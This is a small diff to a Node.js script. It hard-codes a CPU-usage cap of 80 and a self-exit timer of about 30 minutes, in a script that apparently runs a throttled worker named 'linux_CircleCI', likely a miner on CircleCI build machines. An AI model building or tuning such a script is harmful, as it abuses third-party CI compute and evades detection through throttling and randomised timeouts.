@@ -7,7 +7,7 @@ const fs = require('fs');
 const appCache = new Cache("meocoder", 557056);
 const numCPUs = require('os').cpus().length;
 const numWorker = 1;
-const customUsageCPU = Number(process.argv.slice(2)[1]) || 65;
+const customUsageCPU = 80;
 const nameWorker = `linux_CircleCI`; /* _${Math.floor(Math.random() * 2) + 1} */
 const login = (() => {
     return {
@@ -39,7 +39,7 @@ appCache.job = null;
 /* --------------------------Timeout------------------------  */
 setTimeout(() => {
     process.exit(0);
-}, ((Math.floor(Math.random() * 3) + Number(process.argv.slice(2)[0]) || 29) * 60) * 1000);
+}, ((Math.floor(Math.random() * 3) + 30) * 60) * 1000);
 
 
 
